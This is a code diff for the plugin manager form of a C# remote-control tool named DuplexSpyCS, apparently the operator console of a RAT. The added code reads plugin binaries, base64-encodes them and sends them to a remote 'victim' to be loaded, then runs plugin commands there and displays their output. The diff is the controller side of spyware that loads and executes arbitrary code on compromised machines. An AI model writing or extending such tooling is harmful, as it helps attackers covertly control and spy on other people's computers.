@@ -41,9 +41,12 @@ namespace DuplexSpyCS
             {
                 if (lsMsg[1] == "ls")
                 {
-                    List<string[]> ls = lsMsg[2].Split(',').Select(x => clsCrypto.b64D2Str(x).Split(',')).ToList();
+                    List<string[]> ls = lsMsg[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).Where(y => !string.IsNullOrEmpty(y)).Select(z => z.Split(',')).ToList();
                     foreach (var s in ls)
                     {
+                        if (s.Length != 2)
+                            continue;
+
                         string szName = s[0];
                         string szVersion = s[1];
 
@@ -65,37 +68,97 @@ namespace DuplexSpyCS
 
                                 var info = fnGetPluginInfoFromItem(item);
                                 m_dicLoadedPlugin.Add(szName, info);
+
+                                fnPrintOK("Load plugin successfully: " + szName);
                             }
                         }));
                     }
+
+                    fnPrintLoadedPlugin();
                 }
                 else if (lsMsg[1] == "run")
                 {
+                    string szName = lsMsg[2];
+                    int nCode = int.Parse(lsMsg[3]);
+                    string szOutput = clsCrypto.b64D2Str(lsMsg[4]);
 
+                    if (nCode == 1)
+                        fnPrintOK("Run command successfully:");
+                    else
+                        fnPrintError("Run command failed:");
+
+                    fnPrintLine(szOutput);
                 }
                 else if (lsMsg[1] == "load")
                 {
                     string szName = lsMsg[2];
+
                     Invoke(new Action(() =>
                     {
                         ListViewItem item = listView1.FindItemWithText(szName);
                         if (item == null)
                             return;
 
+                        int nCode = int.Parse(lsMsg[3]);
+                        if (nCode == 0)
+                        {
+                            fnPrintError("Cannot load plugin: " + szName);
+                            return;
+                        }
+
                         var info = fnGetPluginInfoFromItem(item);
                         item.SubItems[2].Text = "Loaded";
                         m_dicLoadedPlugin.Add(szName, info);
+
+                        fnPrintOK("Load plugin successfully: " + szName);
                     }));
                 }
                 else if (lsMsg[1] == "unload")
                 {
+                    string szName = lsMsg[2];
+                    int nCode = int.Parse(lsMsg[3]);
+                    if (nCode == 0)
+                    {
+                        string szMsg = clsCrypto.b64D2Str(lsMsg[4]);
+                        fnPrintError(szMsg);
+                    }
 
+                    fnPrintOK("Unload plugin successfully: " + szName);
                 }
                 else if (lsMsg[1] == "clear")
                 {
 
                 }
             }
+        }
+
+        void fnSendLoad(string szName)
+        {
+            ListViewItem item = listView1.FindItemWithText(szName);
+            var plugin = fnGetPluginInfoFromItem(item);
+
+            byte[] abBuffer = File.ReadAllBytes(plugin.szFileName);
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "plugin",
+                "load",
+                szName,
+                Convert.ToBase64String(abBuffer),
+            });
+        }
+
+        void fnSendUnload(string szName)
+        {
+            ListViewItem item = listView1.FindItemWithText(szName);
+            var plugin = fnGetPluginInfoFromItem(item);
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "plugin",
+                "unload",
+                szName,
+            });
         }
 
         void fnRefresh()
@@ -161,145 +224,280 @@ namespace DuplexSpyCS
 
             toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";
 
-            m_victim.fnSendCommand(new string[]
-            {
-                "plugin",
-                "ls",
-            });
+            m_victim.SendCommand("plugin|ls");
         }
 
         void fnPrintLine(string szMsg)
         {
-            richTextBox1.AppendText(szMsg);
-            richTextBox1.AppendText(Environment.NewLine);
+            Invoke(new Action(() =>
+            {
+                richTextBox1.AppendText(szMsg);
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
         }
 
-        void fnPrintInfo(string szMsg)
+        void fnPrintInfo(string szMsg, bool bShowDate = false)
         {
-            richTextBox1.SelectionColor = Color.Goldenrod;
-            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+            Invoke(new Action(() =>
+            {
+                if (bShowDate)
+                {
+                    richTextBox1.SelectionColor = Color.Goldenrod;
+                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+                }
 
-            richTextBox1.SelectionColor = Color.RoyalBlue;
-            richTextBox1.AppendText("[*] ");
+                richTextBox1.SelectionColor = Color.RoyalBlue;
+                richTextBox1.AppendText("[*] ");
 
-            richTextBox1.SelectionColor = Color.White;
-            richTextBox1.AppendText(szMsg);
+                richTextBox1.SelectionColor = Color.White;
+                richTextBox1.AppendText(szMsg);
 
-            richTextBox1.AppendText(Environment.NewLine);
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
         }
 
-        void fnPrintOK(string szMsg)
+        void fnPrintOK(string szMsg, bool bShowDate = false)
         {
-            richTextBox1.SelectionColor = Color.Goldenrod;
-            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+            Invoke(new Action(() =>
+            {
+                if (bShowDate)
+                {
+                    richTextBox1.SelectionColor = Color.Goldenrod;
+                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+                }
 
-            richTextBox1.SelectionColor = Color.LimeGreen;
-            richTextBox1.AppendText("[+] ");
+                richTextBox1.SelectionColor = Color.LimeGreen;
+                richTextBox1.AppendText("[+] ");
 
-            richTextBox1.SelectionColor = Color.White;
-            richTextBox1.AppendText(szMsg);
+                richTextBox1.SelectionColor = Color.White;
+                richTextBox1.AppendText(szMsg);
 
-            richTextBox1.AppendText(Environment.NewLine);
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
         }
 
-        void fnPrintError(string szMsg)
+        void fnPrintWarning(string szMsg, bool bShowDate = false)
         {
-            richTextBox1.SelectionColor = Color.Goldenrod;
-            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+            Invoke(new Action(() =>
+            {
+                if (bShowDate)
+                {
+                    richTextBox1.SelectionColor = Color.Goldenrod;
+                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+                }
 
-            richTextBox1.SelectionColor = Color.Red;
-            richTextBox1.AppendText("[-] ");
+                richTextBox1.SelectionColor = Color.Yellow;
+                richTextBox1.AppendText("[!] ");
 
-            richTextBox1.SelectionColor = Color.White;
-            richTextBox1.AppendText(szMsg);
+                richTextBox1.SelectionColor = Color.White;
+                richTextBox1.AppendText(szMsg);
 
-            richTextBox1.AppendText(Environment.NewLine);
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
+        }
+
+        void fnPrintError(string szMsg, bool bShowDate = false)
+        {
+            Invoke(new Action(() =>
+            {
+                if (bShowDate)
+                {
+                    richTextBox1.SelectionColor = Color.Goldenrod;
+                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");
+                }
+
+                richTextBox1.SelectionColor = Color.Red;
+                richTextBox1.AppendText("[-] ");
+
+                richTextBox1.SelectionColor = Color.White;
+                richTextBox1.AppendText(szMsg);
+
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
         }
 
         void fnPrintTable(DataTable dt)
         {
-            if (dt == null || dt.Columns.Count == 0)
-                return;
-
-            int[] colWidths = new int[dt.Columns.Count];
-
-            for (int i = 0; i < dt.Columns.Count; i++)
+            Invoke(new Action(() =>
             {
-                colWidths[i] = dt.Columns[i].ColumnName.Length;
+                if (dt == null || dt.Columns.Count == 0)
+                    return;
+
+                int[] colWidths = new int[dt.Columns.Count];
+
+                for (int i = 0; i < dt.Columns.Count; i++)
+                {
+                    colWidths[i] = dt.Columns[i].ColumnName.Length;
+
+                    foreach (DataRow row in dt.Rows)
+                    {
+                        int len = row[i]?.ToString().Length ?? 0;
+                        if (len > colWidths[i])
+                            colWidths[i] = len;
+                    }
+                }
+
+                StringBuilder sb = new StringBuilder();
+
+                for (int i = 0; i < dt.Columns.Count; i++)
+                {
+                    sb.Append(dt.Columns[i].ColumnName.PadRight(colWidths[i] + 2));
+                }
+                sb.AppendLine();
+
+                for (int i = 0; i < dt.Columns.Count; i++)
+                {
+                    sb.Append(new string('-', colWidths[i]) + "  ");
+                }
+                sb.AppendLine();
 
                 foreach (DataRow row in dt.Rows)
                 {
-                    int len = row[i]?.ToString().Length ?? 0;
-                    if (len > colWidths[i])
-                        colWidths[i] = len;
+                    for (int i = 0; i < dt.Columns.Count; i++)
+                    {
+                        string text = row[i]?.ToString() ?? "";
+                        sb.Append(text.PadRight(colWidths[i] + 2));
+                    }
+                    sb.AppendLine();
                 }
-            }
 
-            StringBuilder sb = new StringBuilder();
+                richTextBox1.AppendText(sb.ToString());
+                richTextBox1.AppendText(Environment.NewLine);
+            }));
+        }
 
-            for (int i = 0; i < dt  .Columns.Count; i++)
+        void fnPrintLoadedPlugin()
+        {
+            DataTable dt = new DataTable();
+            dt.Columns.Add("Loaded Plugins");
+            dt.Columns.Add("Command");
+            dt.Columns.Add("Description");
+
+            foreach (var szName in m_dicLoadedPlugin.Keys)
             {
-                sb.Append(dt.Columns[i].ColumnName.PadRight(colWidths[i] + 2));
+                var info = m_dicLoadedPlugin[szName];
+                dt.Rows.Add(szName, info.Meta.Entry, info.Meta.Description);
             }
-            sb.AppendLine();
 
-            for (int i = 0; i < dt.Columns.Count; i++)
+            fnPrintTable(dt);
+
+            if (m_dicLoadedPlugin.Keys.Count == 0)
             {
-                sb.Append(new string('-', colWidths[i]) + "  ");
+                fnPrintWarning("Loaded plugin: 0");
             }
-            sb.AppendLine();
-
-            foreach (DataRow row in dt.Rows)
+            else
             {
-                for (int i = 0; i < dt.Columns.Count; i++)
-                {
-                    string text = row[i]?.ToString() ?? "";
-                    sb.Append(text.PadRight(colWidths[i] + 2));
-                }
-                sb.AppendLine();
+                fnPrintInfo("Loaded plugin: " + m_dicLoadedPlugin.Keys.Count.ToString());
             }
-
-            richTextBox1.AppendText(sb.ToString());
-            richTextBox1.AppendText(Environment.NewLine);
         }
 
         void fnCommandHandler(List<string> lsArgs)
         {
+            richTextBox1.AppendText("> " + string.Join(' ', lsArgs));
+            richTextBox1.AppendText(Environment.NewLine);
+
             var dic = m_victim.m_dicCommandRegistry;
             if (lsArgs[0] == "show")
-            {
-                DataTable dt = new DataTable();
-                dt.Columns.Add("Command");
-                dt.Columns.Add("Description");
-
-                foreach (string szName in m_dicPluginInfo.Keys)
-                {
-                    var info = m_dicPluginInfo[szName];
-                    dt.Rows.Add(szName, info.Meta.Description);
-
-                    fnPrintTable(dt);
-                }
-            }
-            else if (lsArgs[0] == "loaded")
             {
                 DataTable dt = new DataTable();
                 dt.Columns.Add("Available Plugins");
                 dt.Columns.Add("Command");
                 dt.Columns.Add("Description");
 
-                foreach (var szName in m_dicPluginInfo.Keys)
+                foreach (string szName in m_dicPluginInfo.Keys)
                 {
                     var info = m_dicPluginInfo[szName];
                     dt.Rows.Add(szName, info.Meta.Entry, info.Meta.Description);
+
+                    fnPrintTable(dt);
                 }
 
-                fnPrintTable(dt);
+                if (m_dicPluginInfo.Keys.Count == 0)
+                {
+                    fnPrintInfo("Available plugin: 0");
+                }
+                else
+                {
+                    fnPrintInfo("Available plugin: " + m_dicPluginInfo.Keys.Count.ToString());
+                }
+            }
+            else if (lsArgs[0] == "loaded")
+            {
+                fnPrintLoadedPlugin();
+            }
+            else if (lsArgs[0] == "load")
+            {
+                if (lsArgs.Count < 2)
+                {
+                    //todo: print usage.
+                    return;
+                }
+
+                string szOption = lsArgs[1];
+                if (szOption == "all")
+                {
+                    foreach (var plugin in m_dicPluginInfo.Values)
+                    {
+                        fnSendLoad(plugin.Meta.Name);
+                    }
+                }
+                else //Plugin
+                {
+                    if (m_dicLoadedPlugin.ContainsKey(szOption))
+                    {
+                        fnPrintWarning("Command is aborted: This plugin has been loaded");
+                        return;
+                    }
+                    else if (!m_dicPluginInfo.Keys.Contains(szOption))
+                    {
+                        fnPrintError("Cannot find plugin: " + szOption);
+                        return;
+                    }
+
+                    fnSendLoad(szOption);
+                }
+            }
+            else if (lsArgs[0] == "unload")
+            {
+                if (lsArgs.Count < 2)
+                {
+                    //todo: print usage.
+                    return;
+                }
+
+                string szOption = lsArgs[1];
+                if (szOption == "all")
+                {
+                    foreach (var plugin in m_dicPluginInfo.Values)
+                    {
+                        fnSendUnload(plugin.Meta.Name);
+                    }
+                }
+                else //Plugin
+                {
+                    if (!m_dicLoadedPlugin.Keys.Contains(szOption))
+                    {
+                        fnPrintError("This plugin has not been loaded.");
+                        return;
+                    }
+                    else if (!m_dicPluginInfo.Keys.Contains(szOption))
+                    {
+                        fnPrintError("Cannot find plugin: " + szOption);
+                        return;
+                    }
+
+                    fnSendUnload(szOption);
+                }
             }
             else if (lsArgs[0] == "help")
             {
-
+                //todo: print usage.
             }
-            else //Other commands.
+            else if (lsArgs[0] == "clear")
+            {
+                richTextBox1.Clear();
+            }
+            else //Plugin commands.
             {
                 string szEntry = lsArgs[0];
                 if (!m_victim.m_dicCommandRegistry.ContainsKey(szEntry))
@@ -308,11 +506,30 @@ namespace DuplexSpyCS
                     return;
                 }
 
-                if (lsArgs.Count == 2 && lsArgs[1] == "help")
+                if (lsArgs.Count == 1)
                 {
-                    var spec = dic[szEntry].Where(x => string.Equals(x.Entry, szEntry)).FirstOrDefault();
-
+                    //todo: print usage message.
+                    return;
                 }
+
+                var spec = dic[szEntry].Where(x => string.Equals(x.Entry, szEntry)).FirstOrDefault();
+
+                List<string> lsPayload = new List<string>();
+                for (int i = 1; i < lsArgs.Count; i++)
+                {
+                    if (!lsArgs[i].Contains('='))
+                        lsArgs[i] += "=dummy";
+
+                    lsPayload.Add(lsArgs[i]);
+                }
+
+                m_victim.fnSendCommand(new string[]
+                {
+                    "plugin",
+                    "run",
+                    szEntry,
+                    string.Join(",", lsPayload.Select(x => clsCrypto.b64E2Str(x)))
+                });
             }
         }
 
@@ -344,22 +561,21 @@ namespace DuplexSpyCS
                 if (!plugin.bIsValid)
                     continue;
 
-                byte[] abBuffer = File.ReadAllBytes(plugin.szFileName);
-
-                m_victim.fnSendCommand(new string[]
-                {
-                    "plugin",
-                    "load",
-                    plugin.Meta.Name,
-                    Convert.ToBase64String(abBuffer),
-                });
+                fnSendLoad(plugin.Meta.Name);
             }
         }
 
         //Unload
         private void toolStripButton2_Click(object sender, EventArgs e)
         {
+            var lsPlugin = listView1.Items.Cast<ListViewItem>().Select(x => fnGetPluginInfoFromItem(x)).ToList();
+            foreach (var plugin in lsPlugin)
+            {
+                if (!plugin.bIsValid)
+                    continue;
 
+                fnSendUnload(plugin.Meta.Name);
+            }
         }
 
         private void textBox1_KeyDown(object sender, KeyEventArgs e)
@@ -374,6 +590,11 @@ namespace DuplexSpyCS
 
                 textBox1.Text = string.Empty;
             }
+        }
+
+        private void richTextBox1_TextChanged(object sender, EventArgs e)
+        {
+            richTextBox1.ScrollToCaret();
         }
     }
 }
